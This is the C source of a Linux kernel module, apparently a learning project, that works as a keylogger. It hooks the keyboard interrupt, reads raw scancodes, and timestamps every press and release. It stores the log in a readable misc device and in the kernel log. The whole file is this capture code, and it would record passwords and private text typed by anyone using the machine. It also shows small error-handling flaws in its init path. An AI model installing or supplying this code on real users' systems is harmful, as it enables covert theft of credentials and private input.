#include "dinologger.h"

unsigned char *kbus[] = {US_KBMAP};
unsigned int stats[97] = {0};

ssize_t device_read(struct file *, char *, size_t, loff_t *);

int register_device(void);
void unregister_device(void);
int __init m_init(void);
void __exit m_exit(void);
void add_entry(int scancode, int release, struct rtc_time *time);
char *strdup(char const *str);
char *strjoin_nl(char const *str1, char const *str2);
char *clean_join(char *str1, char *str2);

char *character_device_file;
int cd_file_size = 0;

static struct file_operations fops = {
	.owner = THIS_MODULE,
	.read = device_read,
};

char *strdup(char const *str) {
	int len = strlen(str);
	char *result = kmalloc((len + 1) * sizeof(char), GFP_KERNEL);
	if (!result)
		return NULL;
	for (int i = 0; i < len; i++) {
		result[i] = str[i];
	}
	result[len] = '\0';
	return result;
}

char *strjoin_nl(char const *str1, char const *str2) {
	size_t	len_str1 = strlen(str1);
	size_t	len_str2 = strlen(str2);

	char *result = kmalloc((len_str1 + len_str2 + 2) * sizeof(char), GFP_KERNEL);
	if (!result)
		return (NULL);

	for (int i = 0; i < len_str1; i++) {
		result[i] = str1[i];
	}
	for (int i = 0; i < len_str2; i++) {
		result[i + len_str1] = str2[i];
	}

	result[len_str1 + len_str2] = '\n';
	result[len_str1 + len_str2 + 1] = '\0';
	return (result);
}

ssize_t device_read(struct file *filep, char *u_buffer, size_t len, loff_t *offset) {
	LOG("reading device");

	if (*offset >= cd_file_size)
		return 0;
	if (*offset + len > cd_file_size)
		len = cd_file_size - *offset;
	if (copy_to_user(u_buffer, character_device_file + *offset, len) != 0)
		return -EFAULT;

	*offset += len;
	return len;
}

struct miscdevice misc;
int register_device(void) {
	misc.minor = MISC_DYNAMIC_MINOR;
	misc.name = DEVICE_NAME;
	misc.fops = &fops;

	int res = misc_register(&misc);
	if (res < 0) {
		LOGF("failed to register - error code: %d", res);
		return res;
	}
	LOG("registered device");
	return 0;
}
void unregister_device(void) {
	LOG("unregistering");
	misc_deregister(&misc);
}

void add_entry(int scancode, int release, struct rtc_time *time) {
	char entry[42];
	int len = scnprintf(entry, 42,
			"[%ptRt] %s (%d) %s",
			time, NAME(scancode), scancode, STATE(release));

	if (len <= 0)
		return ;
	char *join = strjoin_nl(character_device_file, entry);
	if (!join)
		return ;

	kfree(character_device_file);
	character_device_file = join;
	cd_file_size += len + 1;

	LOGF("%s", entry);
	if (!release)
		STAT(scancode);
}

static irqreturn_t irq_handler(int irq, void *dev_id) {
	int scancode = inb(0x60);
	int release = scancode & RELEASE;
	scancode &= CANCEL_RELEASE;

	struct rtc_time time = rtc_ktime_to_tm(ktime_get_real());
	WINTER_TIME(time);

	add_entry(scancode, release, &time);
	return IRQ_NONE;
}

int __init m_init(void) {
	LOG("trying to init");
	int err = 0;

	err = register_device();
	if (err)
		return err;
	err = request_irq(1, irq_handler, IRQF_SHARED, "dino_keyboard", (void *)irq_handler);
	if (err) {
		LOG("request_irq failed");
		return err;
	}
	character_device_file = strdup("");
	if (!character_device_file) {
		LOG("buffer init failed");
		return err;
	}
	return 0;
}

void __exit m_exit(void) {
	unregister_device();

	int max = 0;
	int sum = 0;
	for (int i = 0; i < 97; i++) {
		if (MAPPED(i)) {
			if (stats[i] > stats[max])
				max = i;
			sum += stats[i];
		}
	}
	LOGF("you pressed %d keys", sum);
	LOGF("most pressed key is '%s': %d times !", kbus[max], stats[max]);

	free_irq(1, (void *)irq_handler);
	kfree(character_device_file);
	return;
}

MODULE_LICENSE ("GPL");
MODULE_AUTHOR("DinoMalin");

module_init(m_init);
module_exit(m_exit);
